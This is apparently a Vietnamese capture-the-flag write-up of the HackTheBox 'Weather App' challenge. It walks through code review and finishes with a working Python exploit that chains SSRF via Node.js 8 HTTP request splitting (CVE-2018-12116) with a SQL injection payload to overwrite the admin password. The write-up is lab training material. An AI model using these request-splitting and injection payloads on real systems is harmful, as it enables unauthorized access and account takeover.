# Weather App --- Hackthebox(CVE 2018-12116 SSRF via request splitting)

Challenge category: Web
Level: Easy

# CHALLENGE DESCRIPTION
A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life, it’s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I’ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that’s operating this website and set me free!

# OVERVIEW 
Bắt đầu challenge cho ta trang web như sau với chức năng dự báo thời tiết ở khu vực của bạn.

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/d915872a-7c20-4131-8f6f-75216556fe88)

Mình đi đến file của challenge. Bắt đầu với file `package.json`

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/8a24c775-871c-42eb-b35a-7b8aa21024c3)

Từ đây ta biết được rằng challenge được xây dựng bởi  `nodejs version 8.12.0` và ở dependencies là `sqlite-async` nghĩa là app sử dụng sqlite database để lưu trữ data.

Sau đó thì mình có research về [Nodejs-2018-vulnerabilities]([https://nodejs.org/en/download/releases](https://cyber.vumetric.com/vulns/nodejs/node-js/8-12-0/))

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/9157189b-62e2-40be-bd9d-c74dfe8cee77)

Tiếp theo, mình tiếp tục research tiếp về request splitting vuln để note lại idea giải challenge(https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/).

Có thể note lại idea từ bài viết kia là **bởi vì "phiên bản Node.js 8 hoặc thấp hơn không chuẩn hóa các ký tự Unicode có dấu".Nên ta có thể sử dụng cách splitting request.**

## Analyzing code

```Node.js
router.get('/register', (req, res) => {
	return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});

router.get('/login', (req, res) => {
	return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});

router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
});
```
Chúng ta có 3 endpoints: `/register`, `/login` và `/api/weather`

Bắt đầu từ phần chính của file `index.js` qua code review, ở trong routes có trang `/register` và `/login` chấp nhận phương thức POST.

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/97b570b6-9af7-4a4f-98ed-acf9a39d2576)

Ở đây chúng ta có thể đăng kí user mới bằng cách request http phương thức POST nếu request đó từ ip local 127.0.0.1 nếu không phải thì sẽ bị fail. 

Thì theo idea được ghi ở overview thì ta cần tạo SSRF. Chúng ta có API, và cái API đó nhận những request từ client để lấy thông tin thời tiết từ tham số (`endpoint`, `country` và `city`) mà được cung cấp.

Và ta có thể chèn endpoint để tạo payload để request POST lên `/register` endpoint sao cho cái request đó xuất hiện lên từ chính nó.

Vậy ta có thêm idea **Tham số endpoint trong /api/weather chứa dữ liệu tải lên có lỗ hổng. Dữ liệu tải lên lỗ hổng này được tạo bởi request POST đến /register và khai thác lỗ hổng SQL trong endpoint API /register.**

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/e03564b4-23ac-4f0f-8c02-b96f9bb6a202)

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/30b5e036-4e20-44be-b077-d7920376f81b)

Tiếp theo trong route `/login` , nếu ta login đúng với admin username và password ta sẽ lấy được flag.

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/c85f2ec6-31c9-4b95-abfb-0247d2f87330)

Mình chuyển sang file `database.js`, function `isAdmin()` kiểm tra xem nều username là admin hay không

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/5e72081f-b91b-48f2-aaaa-3d2331e85e90)

Tiếp theo là function  `migrate`, tạo username là admin với random password cùng lúc với thời gian app chạy

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/85fa12ff-dc34-42cb-8404-37f3d8f885c8)

 ## Conclusion vuln found

 1. Ở request POST http đến `/register`. không có filter cho `username` và `passowrd ` do đó ta có thế áp dụng SQLi.

 2. Trong request POST HTTP tới `/api/weather` là từ máy chủ ứng dụng và không có filter cho các tham số `endpoint, city và country` do đó dễ bị tấn công Server-Side Request Forgery (SSRF).

 3. Web đang chạy trên phiên bản Node.js 8.12.0, có lỗ hổng về HTTP Request Smuggling.
 
 ## Attacking

 Bây giờ mình chạy local bằng cách host weather app sử dụng dockerfile

 ![image](https://github.com/Llam-a/HackTheBox/assets/115911041/45b082a7-7287-4012-9305-e149ce83fe14)

 Đầu tiên là dựa vào SSRF vuln, ta gửi request đến `/register` từ đến máy chủ chính nó

 Bởi vì request được cố định tới http.get ở trong `insideWeather()`-file `helpermethod`. Vậy ta có thề dùng `HTTP request splitting vulnerablity` để đưa request http POST tới `/register` trong tham số `endpoint` của request `/api/weather`.

 Do admin đã đăng kí vào thời gian app khởi động, để overwrite user với password mới ta dùng SQLi querry với tham số `password` của request POST tới `/register`.

Bắt đầu với câu truy vấn để bypass

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/af5ec5ff-8b18-433f-99ec-88418782064c)

Sử dụng keyword `ON CONFLICT` 

`INSERT INTO users (username, password) VALUES ('admin', '1') ON CONFLICT(username) DO UPDATE SET password = 'admin';--')`

Password và username sẽ trở thành:

```
username = "admin" 
password = "1') ON CONFLICT(username) DO UPDATE SET password = 'admin';-- "
```

Tiếp đến là sử dụng splitting unicode  

```
   "\u0120"; space
   "\u010D"; \r
   "\u010A"; \n
   "%27"; singleInvertedConverted
   "%22"; double inverted comma
```

Và ta có solve.py

```python
import requests

username = 'admin' 
password = "111') ON CONFLICT (username) DO UPDATE SET password='123';--"  #SQL injection

username = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
#print(contentLength)

# \u0120=space char, \u010D=\r and \u010A=\n
endpoint = "127.0.0.1/" + "\u0120" + "HTTP/1.1" + "\u010D\u010A"  +  "Host:" + "\u0120"\
    + "127.0.0.1" + "\u010D\u010A" + "\u010D\u010A" + "POST" + "\u0120" + "/register" +\
    "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120" + "127.0.0.1" + "\u010D\u010A"\
    + "Content-Type:" + "\u0120" + "application/x-www-form-urlencoded" + "\u010D\u010A" + \
    "Content-Length:" + "\u0120" + str(len(username) + len(password) + 19) + \
    "\u010D\u010A" + "\u010D\u010A" + "username=" + username + "&password=" + password\
    + "\u010D\u010A" + "\u010D\u010A" + "GET" + "\u0120"
r=requests.post('http://localhost/api/weather', json={'endpoint': endpoint, 'city': 'Ho Chi Minh City', 'country': 'VN'},  headers={'Connection':'close'})
print(r.text)
```

Mình thử chạy trên local trước, và lụm key thôi

![image](https://github.com/Llam-a/HackTheBox/assets/115911041/bcdae809-32b0-4fb1-8298-a2d2282b4119)


READMORE

1. https://blog.csdn.net/f_cccc/article/details/116406838

2. https://s-3ntinel.github.io/hackthebox/challenges/web/weather_app/weather_app.html

3. https://infosec.itsmeuday.com/blog/htb_weather_app

4. SQL query https://www.prisma.io/dataguide/postgresql/inserting-and-modifying-data/insert-on-conflict

5. https://dopey.gitbook.io/sh0w-4nd-t3ll/hacker-boy/hackthebox/challenges/weather-app






 










